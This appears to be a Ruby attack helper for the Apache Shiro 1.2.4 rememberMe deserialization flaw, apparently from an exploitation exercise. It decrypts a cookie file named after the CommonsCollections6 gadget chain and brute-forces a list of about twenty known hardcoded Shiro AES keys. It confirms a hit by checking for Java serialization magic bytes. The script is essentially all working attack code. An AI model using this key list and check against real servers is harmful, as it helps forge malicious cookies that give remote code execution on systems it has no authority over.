#!/usr/bin/env ruby
# loop3 t7 C1 — 密钥验证：我们自己解密一次，并在容器内用 Java 侧同样逻辑验证
# 关键点：Shiro 1.2.4 的 CookieRememberMeManager 用 AES-128-CBC，IV 前置；密钥硬编码在 AbstractRememberMeManager 的 DEFAULTCIPHERKEY。
require 'openssl'
require 'base64'

key_b64 = ARGV[0] || 'kPH+bIxk5D2deZiIxcaaaA=='
ck_file = ARGV[1] || '/tmp/t7-ts-CommonsCollections6.txt'
ck = File.read(ck_file).strip
raw = Base64.decode64(ck)
puts "COOKIE_LEN=#{ck.length} RAW_B64DECODED=#{raw.bytesize}"
iv = raw[0, 16]
ct = raw[16..-1]
puts "IV_HEX=#{iv.unpack1('H*')}"
puts "CT_LEN=#{ct.bytesize}"

key = Base64.decode64(key_b64)
puts "KEY_LEN=#{key.bytesize} KEY_HEX=#{key.unpack1('H*')}"

d = OpenSSL::Cipher.new('aes-128-cbc')
d.decrypt
d.key = key
d.iv = iv
begin
  pt = d.update(ct) + d.final
  puts "DECRYPT_OK len=#{pt.bytesize} magic=#{pt[0,4].unpack1('H*')}"
  puts "PT_HEAD=#{pt[0,40].inspect}"
rescue => e
  puts "DECRYPT_FAIL #{e.class}: #{e.message}"
end

# 也试 Shiro 1.2.4 default 的完整 16 字节 key 清单（常见硬编码 key）
COMMON = [
  'kPH+bIxk5D2deZiIxcaaaA==',
  '2AvVhdsgUs0FSA3SDFAdag==',
  '3AvVhmFLUs0KTA3Kprsdag==',
  '4AvVhmFLUs0KTA3Kprsdag==',
  'Z3VucwAAAAAAAAAAAAAAAA==',
  'wGiHplamyXlVB11UXWol8g==',
  'fCq+/xW488hMTCD+cmJ3aQ==',
  '1QWLxg+NYmxraMoxAXu/Iw==',
  'ZUdsaGJuSmxibVI2ZHc9PQ==',
  'L7RioUULEFhRyxM7a2R/Yg==',
  'a2VlcE9uR29pbmdBbmRGaQ==',
  'WcfHGU25gNnTxTlmJMeSpw==',
  'bWljcm9zAAAAAAAAAAAAAA==',
  'bWluZS1hc3NvY2lhdGlvbg==',
  '5aaC5qKm5oqA5pyvAAAAAA==',
  '6ZmI6I2j5Y+R5aSn5ZOlAA==',
  'r0e3c16IdVkouZgk1TKVMg==',
  'MTIzNDU2Nzg5MGFiY2RlZg==',
  'U3ByaW5nQmxhZGUAAAAAAA==',
  'YWJjZGVmZ2hpamtsbW5vcA==',
]
good = []
COMMON.each do |k|
  kb = Base64.decode64(k)
  next unless kb.bytesize == 16
  dd = OpenSSL::Cipher.new('aes-128-cbc'); dd.decrypt; dd.key = kb; dd.iv = iv
  begin
    p2 = dd.update(ct) + dd.final
    if p2[0,4].unpack1('H*') == 'aced0005'
      puts "KEY_MATCH(b64)=#{k} -> decrypted magic ok, len=#{p2.bytesize}"
      good << k
    end
  rescue
  end
end
puts "MATCHING_KEYS=#{good.inspect}"
puts "CANDIDATE_COUNT=#{COMMON.length}"
